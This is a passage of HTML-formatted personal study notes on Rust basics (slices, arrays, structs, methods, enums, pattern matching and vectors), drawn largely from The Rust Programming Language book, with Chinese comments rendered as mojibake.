class="hljs-keyword">let</span> bytes = s.as_bytes();<br>    <span class="hljs-keyword">for</span> (i, &amp;item) <span class="hljs-keyword">in</span> bytes.iter().enumerate() &#123;<br>        <span class="hljs-keyword">if</span> item == <span class="hljs-string">b&#x27; &#x27;</span> &#123;<br>            <span class="hljs-keyword">return</span> &amp;s[<span class="hljs-number">0</span>..i];<br>        &#125;<br>    &#125;<br>    &amp;s[..] <span class="hljs-comment">//equals &amp;s[0..len]</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">first_word</span></span>(s: &amp;<span class="hljs-built_in">str</span>) -&gt; &amp;<span class="hljs-built_in">str</span> &#123;&#125;<span class="hljs-comment">//use the same function on both &amp;String values and &amp;str values.</span><br></code></pre></div></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> my_string = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello world&quot;</span>);<br><br>    <span class="hljs-comment">// first_word works on slices of `String`s</span><br>    <span class="hljs-keyword">let</span> word = first_word(&amp;my_string[..]);<br><br>    <span class="hljs-keyword">let</span> my_string_literal = <span class="hljs-string">&quot;hello world&quot;</span>;<br><br>    <span class="hljs-comment">// first_word works on slices of string literals</span><br>    <span class="hljs-keyword">let</span> word = first_word(&amp;my_string_literal[..]);<br><br>    <span class="hljs-comment">// Because string literals *are* string slices already,</span><br>    <span class="hljs-comment">// this works too, without the slice syntax!</span><br>    <span class="hljs-keyword">let</span> word = first_word(my_string_literal);<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="Compound-type"><a href="#Compound-type" class="headerlink" title="Compound type"></a>Compound type</h1><h2 id="array"><a href="#array" class="headerlink" title="array"></a>array</h2><ul><li><strong>æ•°ç»„æ˜¯ Rust çš„åŸºæœ¬ç±»å‹ï¼Œæ˜¯å›ºå®šé•¿åº¦</strong> </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>  <span class="hljs-comment">// ç¼–è¯‘å™¨è‡ªåŠ¨æ¨å¯¼å‡ºoneçš„ç±»å‹</span><br>  <span class="hljs-keyword">let</span> one             = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br>  <span class="hljs-comment">// æ˜¾å¼ç±»å‹æ ‡æ³¨</span><br>  <span class="hljs-keyword">let</span> two: [<span class="hljs-built_in">u8</span>; <span class="hljs-number">3</span>]    = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br>  <span class="hljs-keyword">let</span> blank1          = [<span class="hljs-number">0</span>; <span class="hljs-number">3</span>];<br>  <span class="hljs-keyword">let</span> blank2: [<span class="hljs-built_in">u8</span>; <span class="hljs-number">3</span>] = [<span class="hljs-number">0</span>; <span class="hljs-number">3</span>];<br><br>  <span class="hljs-comment">// arraysæ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œå…¶ä¸­æ¯ä¸€ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…ƒç´ ç±»å‹æ˜¯[u8; 3]</span><br>  <span class="hljs-keyword">let</span> arrays: [[<span class="hljs-built_in">u8</span>; <span class="hljs-number">3</span>]; <span class="hljs-number">4</span>]  = [one, two, blank1, blank2];<br><br>  <span class="hljs-comment">// å€Ÿç”¨arraysçš„å…ƒç´ ç”¨ä½œå¾ªç¯ä¸­</span><br>  <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> &amp;arrays &#123;<br>    <span class="hljs-built_in">print!</span>(<span class="hljs-string">&quot;&#123;:?&#125;: &quot;</span>, a);<br>    <span class="hljs-comment">// å°†aå˜æˆä¸€ä¸ªè¿­ä»£å™¨ï¼Œç”¨äºå¾ªç¯</span><br>    <span class="hljs-comment">// ä½ ä¹Ÿå¯ä»¥ç›´æ¥ç”¨for n in a &#123;&#125;æ¥è¿›è¡Œå¾ªç¯</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> a.iter() &#123;<br>      <span class="hljs-built_in">print!</span>(<span class="hljs-string">&quot;\t&#123;&#125; + 10 = &#123;&#125;&quot;</span>, n, n+<span class="hljs-number">10</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 0..a.len,æ˜¯ä¸€ä¸ª Rust çš„è¯­æ³•ç³–ï¼Œå…¶å®å°±ç­‰äºä¸€ä¸ªæ•°ç»„ï¼Œå…ƒç´ æ˜¯ä»0,1,2ä¸€ç›´å¢åŠ åˆ°åˆ°a.len-1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..a.len() &#123;<br>      sum += a[i];<br>    &#125;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;\t(&#123;:?&#125; = &#123;&#125;)&quot;</span>, a, sum);<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="stuct"><a href="#stuct" class="headerlink" title="stuct"></a>stuct</h2><ul><li>Rust doesnâ€™t allow us to mark only certain fields as mutable. As with any expression, we can construct a new instance of the struct as the last expression in the function body to implicitly return that new instance.</li><li>Unit-like structs can be useful in situations in which you need to implement a trait on some type but donâ€™t have any data that you want to store in the type itself</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-meta">#[derive(Debug)]</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Person</span></span> &#123;<br>    name: <span class="hljs-built_in">String</span>,<br>    age: <span class="hljs-built_in">u8</span>,<br>&#125;<br><br><span class="hljs-comment">// A unit struct</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Unit</span></span>;<br><br><span class="hljs-comment">// A tuple struct</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Pair</span></span>(<span class="hljs-built_in">i32</span>, <span class="hljs-built_in">f32</span>);<br><br><span class="hljs-comment">// A struct with two fields</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Point</span></span> &#123;<br>    x: <span class="hljs-built_in">f32</span>,<br>    y: <span class="hljs-built_in">f32</span>,<br>&#125;<br><br><span class="hljs-comment">// Structs can be reused as fields of another struct</span><br><span class="hljs-meta">#[allow(dead_code)]</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Rectangle</span></span> &#123;<br>    <span class="hljs-comment">// A rectangle can be specified by where the top left and bottom right</span><br>    <span class="hljs-comment">// corners are in space.</span><br>    top_left: Point,<br>    bottom_right: Point,<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-comment">// Create struct with field init shorthand</span><br>    <span class="hljs-keyword">let</span> name = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;Peter&quot;</span>);<br>    <span class="hljs-keyword">let</span> age = <span class="hljs-number">27</span>;<br>    <span class="hljs-keyword">let</span> peter = Person &#123; name, age &#125;;<br><br>    <span class="hljs-comment">// Print debug struct</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>, peter);<br><br><br>    <span class="hljs-comment">// Instantiate a `Point`</span><br>    <span class="hljs-keyword">let</span> point: Point = Point &#123; x: <span class="hljs-number">10.3</span>, y: <span class="hljs-number">0.4</span> &#125;;<br><br>    <span class="hljs-comment">// Access the fields of the point</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;point coordinates: (&#123;&#125;, &#123;&#125;)&quot;</span>, point.x, point.y);<br><br>    <span class="hljs-comment">// Make a new point by using struct update syntax to use the fields of our</span><br>    <span class="hljs-comment">// other one</span><br>    <span class="hljs-keyword">let</span> bottom_right = Point &#123; x: <span class="hljs-number">5.2</span>, ..point &#125;;<br><br>    <span class="hljs-comment">// `bottom_right.y` will be the same as `point.y` because we used that field</span><br>    <span class="hljs-comment">// from `point`</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;second point: (&#123;&#125;, &#123;&#125;)&quot;</span>, bottom_right.x, bottom_right.y);<br><br>    <span class="hljs-comment">// Destructure the point using a `let` binding</span><br>    <span class="hljs-keyword">let</span> Point &#123; x: left_edge, y: top_edge &#125; = point;<br><br>    <span class="hljs-keyword">let</span> _rectangle = Rectangle &#123;<br>        <span class="hljs-comment">// struct instantiation is an expression too</span><br>        top_left: Point &#123; x: left_edge, y: top_edge &#125;,<br>        bottom_right: bottom_right,<br>    &#125;;<br><br>    <span class="hljs-comment">// Instantiate a unit struct</span><br>    <span class="hljs-keyword">let</span> _unit = Unit;<br><br>    <span class="hljs-comment">// Instantiate a tuple struct</span><br>    <span class="hljs-keyword">let</span> pair = Pair(<span class="hljs-number">1</span>, <span class="hljs-number">0.1</span>);<br><br>    <span class="hljs-comment">// Access the fields of a tuple struct</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;pair contains &#123;:?&#125; and &#123;:?&#125;&quot;</span>, pair.<span class="hljs-number">0</span>, pair.<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// Destructure a tuple struct</span><br>    <span class="hljs-keyword">let</span> Pair(integer, decimal) = pair;<br><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;pair contains &#123;:?&#125; and &#123;:?&#125;&quot;</span>, integer, decimal);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>Refactoring with Structs: Adding More Meaning: <strong><u>use struct to wrap relative fields</u></strong> </li><li><strong>print the struct by <code>println!()</code></strong> will get an error, and because struct donâ€™t have a provided implementation of <code>Display</code>, we can only use the <code>#[derived(Debug)]</code> just before the struct definition. Then use <code>â€œ&#123;:?&#125;â€</code> or <code>â€œ&#123;:#?&#125;â€</code> as the formatter.</li></ul><blockquote><p>Rust has provided a number of traits for us to use with the <code>derive</code> annotation that can add useful behavior to our custom types. Those traits and their behaviors are listed in <a href="https://doc.rust-lang.org/book/appendix-03-derivable-traits.html">Appendix C</a>. Weâ€™ll cover how to implement these traits with custom behavior as well as how to create your own traits in Chapter 10.</p></blockquote><ul><li>Struct Update Syntax &amp;&amp; <em>field init shorthand</em> syntax ä¸¤ä¸ªæŒºæœ‰æ„æ€çš„è¯­æ³•. </li><li>The fields in struct that donâ€™t implement Copy trait will lose ownership during assignment.</li><li></li></ul><h1 id="Method-syntax"><a href="#Method-syntax" class="headerlink" title="Method syntax"></a>Method syntax</h1><ul><li><p><a href="https://doc.rust-lang.org/book/ch05-03-method-syntax.html#method-syntax">definition</a> :theyâ€™re defined <strong>within the context of a struct</strong> (or an enum or a trait object) â€¦â€¦</p></li><li><p>intention: Weâ€™ve put all the things we can do with an instance of a type in one <code>impl</code> block rather than making future users of our code search for capabilities of <code>Rectangle</code> in various places in the library we provide.</p></li><li><p><em>automatic referencing and dereferencing</em> : when you call a method with <code>object.something()</code>, Rust automatically adds in <code>&amp;</code>, <code>&amp;mut</code>, or <code>*</code> so <code>object</code> matches the signature of the method. In other words, the following are the same:</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust">p1.distance(&amp;p2);<br>(&amp;p1).distance(&amp;p2);<br></code></pre></div></td></tr></table></figure></li><li><h3 id="Associated-Functions"><a href="#Associated-Functions" class="headerlink" title="Associated Functions"></a><a href="https://doc.rust-lang.org/book/ch05-03-method-syntax.html#associated-functions">Associated Functions</a></h3><ul><li><code>impl</code> blocks allow us to define functions within <code>impl</code> blocks that <em>donâ€™t</em> take <code>self</code> as a parameter. The usage is just like <code>String::from</code>, often used in struct builder.</li></ul></li></ul><h1 id="Enums-and-Pattern-Matching"><a href="#Enums-and-Pattern-Matching" class="headerlink" title="Enums and Pattern Matching"></a><a href="https://doc.rust-lang.org/book/ch06-00-enums.html#enums-and-pattern-matching">Enums and Pattern Matching</a></h1><h2 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h2><ul><li><p>Defining an enum with variants such as the ones in Listing 6-2 is similar to defining different kinds of struct definitions, except the enum doesnâ€™t use the <code>struct</code> keyword and all the variants are grouped together under the <code>Message</code> type.</p></li><li><p>we can define methods on struct and the enums.</p></li><li><p><a href="https://doc.rust-lang.org/book/ch06-01-defining-an-enum.html#the-option-enum-and-its-advantages-over-null-values">The <code>Option</code> Enum and Its Advantages Over Null Values</a></p><ul><li><p>As such, Rust does not have nulls, but it does have an enum that can encode the concept of a value being present or absent. This enum is <code>Option&lt;T&gt;</code> and it is <a href="https://doc.rust-lang.org/std/option/enum.Option.html">defined by the standard library</a> as follows:</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">Option</span></span>&lt;T&gt; &#123;<br>    <span class="hljs-literal">None</span>,<br>    <span class="hljs-literal">Some</span>(T),<br>&#125;<br></code></pre></div></td></tr></table></figure><p>The <code>&lt;T&gt;</code> syntax is generic type parameter.(å°±è·Ÿæ¨¡æ¿æ˜¯ä¸€æ ·çš„)</p></li><li><p>So why is having <code>Option&lt;T&gt;</code> any better than having null? In short, because <code>Option&lt;T&gt;</code> and <code>T</code> (where <code>T</code> can be any type) are <strong>different types</strong>, the common_used_operation wonâ€™t work.</p></li></ul></li></ul><h2 id="match"><a href="#match" class="headerlink" title="match"></a>match</h2><p>å°†æ¨¡å¼ä¸ <code>target</code> è¿›è¡ŒåŒ¹é…ï¼Œå³ä¸º<strong>æ¨¡å¼åŒ¹é…</strong> </p><h3 id="Patterns-that-Bind-to-Values"><a href="#Patterns-that-Bind-to-Values" class="headerlink" title="Patterns that Bind to Values"></a><a href="https://doc.rust-lang.org/book/ch06-02-match.html#patterns-that-bind-to-values">Patterns that Bind to Values</a></h3><p>This is how we can extract values out of enum variants.</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-meta">#[derive(Debug)]</span> <span class="hljs-comment">// so we can inspect the state in a minute</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">UsState</span></span> &#123;<br>    Alabama,<br>    Alaska,<br>    <span class="hljs-comment">// --snip--</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">Coin</span></span> &#123;<br>    Penny,<br>    Nickel,<br>    Dime,<br>    Quarter(UsState),<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">value_in_cents</span></span>(coin: Coin) -&gt; <span class="hljs-built_in">u8</span> &#123; <span class="hljs-comment">//If we were to call value_in_cents(Coin::Quarter(UsState::Alaska))</span><br>    <span class="hljs-keyword">match</span> coin &#123;<br>        Coin::Penny =&gt; <span class="hljs-number">1</span>,<br>        Coin::Nickel =&gt; <span class="hljs-number">5</span>,<br>        Coin::Dime =&gt; <span class="hljs-number">10</span>,<br>        Coin::Quarter(state) =&gt; &#123; <span class="hljs-comment">//then we can use the state variable</span><br>            <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;State quarter from &#123;:?&#125;!&quot;</span>, state);<br>            <span class="hljs-number">25</span><br>&#125;&#125;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="Matching-with-Option-lt-T-gt"><a href="#Matching-with-Option-lt-T-gt" class="headerlink" title="Matching with Option&lt;T&gt;"></a><a href="https://doc.rust-lang.org/book/ch06-02-match.html#matching-with-optiont">Matching with <code>Option&lt;T&gt;</code></a></h3><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">plus_one</span></span>(x: <span class="hljs-built_in">Option</span>&lt;<span class="hljs-built_in">i32</span>&gt;) -&gt; <span class="hljs-built_in">Option</span>&lt;<span class="hljs-built_in">i32</span>&gt; &#123;<br>        <span class="hljs-keyword">match</span> x &#123;<br>            <span class="hljs-literal">None</span> =&gt; <span class="hljs-literal">None</span>,<br>            <span class="hljs-literal">Some</span>(i) =&gt; <span class="hljs-literal">Some</span>(i + <span class="hljs-number">1</span>),<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">let</span> five = <span class="hljs-literal">Some</span>(<span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">let</span> six = plus_one(five);<br>    <span class="hljs-keyword">let</span> none = plus_one(<span class="hljs-literal">None</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><p>Combining <code>match</code> and enums is useful in many situations. Youâ€™ll see this pattern a lot in Rust code: </p><ol><li><code>match</code> against an enum, </li><li>bind a variable to the data inside, and then execute code based on it. </li></ol><p>Itâ€™s a bit tricky at first, but once you get used to it, <strong>youâ€™ll wish you had it in all languages</strong>. Itâ€™s consistently a user favorite.</p></li></ul><h3 id="Matches-Are-Exhaustive"><a href="#Matches-Are-Exhaustive" class="headerlink" title="Matches Are Exhaustive"></a><a href="https://doc.rust-lang.org/book/ch06-02-match.html#matches-are-exhaustive">Matches Are Exhaustive</a></h3><ul><li>Matches in Rust are <em>exhaustive</em>: we must exhaust <u>every last possibility in order for the code to be valid</u>. Especially in the case of <code>Option&lt;T&gt;</code>, when Rust prevents us from forgetting to explicitly handle the <code>None</code> case, it protects us from assuming that we have a value when we might have null, thus making the billion-dollar mistake discussed earlier impossible.</li></ul><h3 id="The-Placeholder"><a href="#The-Placeholder" class="headerlink" title="The _ Placeholder"></a><a href="https://doc.rust-lang.org/book/ch06-02-match.html#the-_-placeholder">The <code>_</code> Placeholder</a></h3><ul><li>The <code>_</code> pattern will match any value.</li></ul><h2 id="Concise-Control-Flow-with-if-let"><a href="#Concise-Control-Flow-with-if-let" class="headerlink" title="Concise Control Flow with if let"></a><a href="https://doc.rust-lang.org/book/ch06-03-if-let.html#concise-control-flow-with-if-let">Concise Control Flow with <code>if let</code></a></h2><ul><li>In other words, you can think of <code>if let</code> as <strong>syntax sugar</strong> for a <code>match</code> that runs code when the value matches <strong>one pattern</strong> and then ignores all other values.</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> some_u8_value = <span class="hljs-literal">Some</span>(<span class="hljs-number">0u8</span>);<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-literal">Some</span>(<span class="hljs-number">3</span>) = some_u8_value &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;three&quot;</span>);<br>&#125;<span class="hljs-comment">// here can add an &quot;else&quot;</span><br><span class="hljs-comment">//equals</span><br><span class="hljs-keyword">match</span> some_u8_value &#123;<br>    <span class="hljs-literal">Some</span>(<span class="hljs-number">3</span>) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;three&quot;</span>),<br>    _ =&gt; (),<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="matches-å®"><a href="#matches-å®" class="headerlink" title="matches!å®"></a><a href="https://course.rs/basic/match-pattern/match-if-let.html#matches%E5%AE%8F">matches!å®</a></h2><p>å®ƒå¯ä»¥å°†ä¸€ä¸ªè¡¨è¾¾å¼è·Ÿæ¨¡å¼è¿›è¡ŒåŒ¹é…ï¼Œç„¶åè¿”å›åŒ¹é…çš„ç»“æœ <code>true</code> or <code>false</code>ã€‚</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-meta">#![allow(unused)]</span><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> foo = <span class="hljs-string">&#x27;f&#x27;</span>;<br>    <span class="hljs-built_in">assert!</span>(matches!(foo, <span class="hljs-string">&#x27;A&#x27;</span>..=<span class="hljs-string">&#x27;Z&#x27;</span> | <span class="hljs-string">&#x27;a&#x27;</span>..=<span class="hljs-string">&#x27;z&#x27;</span>));<br><br>    <span class="hljs-keyword">let</span> bar = <span class="hljs-literal">Some</span>(<span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">assert!</span>(matches!(bar, <span class="hljs-literal">Some</span>(x) <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">2</span>));<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="Managing-Growing-Projects-with-Packages-Crates-and-Modules"><a href="#Managing-Growing-Projects-with-Packages-Crates-and-Modules" class="headerlink" title="Managing Growing Projects with Packages, Crates, and Modules"></a><a href="https://doc.rust-lang.org/book/ch07-00-managing-growing-projects-with-packages-crates-and-modules.html#managing-growing-projects-with-packages-crates-and-modules">Managing Growing Projects with Packages, Crates, and Modules</a></h1><h1 id="Common-Collections"><a href="#Common-Collections" class="headerlink" title="Common Collections"></a><a href="https://doc.rust-lang.org/book/ch08-00-common-collections.html#common-collections">Common Collections</a></h1><h2 id="Vectors"><a href="#Vectors" class="headerlink" title="Vectors"></a><a href="https://doc.rust-lang.org/book/ch08-01-vectors.html#storing-lists-of-values-with-vectors">Vectors</a></h2><h3 id="common-operation"><a href="#common-operation" class="headerlink" title="common operation"></a>common operation</h3><ul><li>Rust provides the <code>vec!</code> macro for convenience. <code>let v = vec![1, 2, 3];</code>  or  <code>let v: Vec&lt;i32&gt; = Vec::new();</code></li><li>use <code>.push()</code> to add elements</li><li>Dropping a Vector Drops Its Elements</li><li>read elements<ul><li>First method is best used when you want your program to crash if thereâ€™s an attempt to access an element past the end of the vector.</li><li>When the <code>get</code> method is passed an index that is outside the vector, it returns <code>None</code> without panicking</li></ul></li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> v = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br><br><span class="hljs-keyword">let</span> does_not_exist = &amp;v[<span class="hljs-number">100</span>];<br><span class="hljs-keyword">let</span> does_not_exist = v.get(<span class="hljs-number">100</span>);<br></code></pre></div></td></tr></table></figure><ul><li>following code wonâ€™t work, because vec may be copied to a new place </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> v = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br><span class="hljs-keyword">let</span> first = &amp;v[<span class="hljs-number">0</span>];<br>v.push(<span class="hljs-number">6</span>);<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;The first element is: &#123;&#125;&quot;</span>, first);<br></code></pre></div></td></tr></table></figure><ul><li>To change the value that the mutable reference refers to, we have to use the dereference operator (<code>*</code>) to get to the value in <code>i</code> before we can use the <code>+=</code> operator</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &amp;<span class="hljs-keyword">mut</span> v &#123;  <span class="hljs-comment">//let mut v = vec![100, 32, 57];</span><br>    *i += <span class="hljs-number">50</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="Using-an-Enum-to-Store-Multiple-Types"><a href="#Using-an-Enum-to-Store-Multiple-Types" class="headerlink" title="Using an Enum to Store Multiple Types"></a><a href="https://doc.rust-lang.org/book/ch08-01-vectors.html#using-an-enum-to-store-multiple-types">Using an Enum to Store Multiple Types</a></h3><ul><li>when we need to store elements of a different type in a vector, we can define and use an enum!</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span 